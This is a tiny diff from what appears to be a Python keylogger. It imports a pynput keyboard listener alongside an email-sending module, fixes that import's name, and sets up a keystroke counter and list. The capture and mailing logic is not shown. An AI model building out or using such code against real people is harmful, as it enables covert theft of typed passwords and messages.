@@ -1,6 +1,6 @@
 import pynput
 from pynput.keyboard import Key, Listener
-import sends_email
+import send_email
 
 count = 0
 keys = []
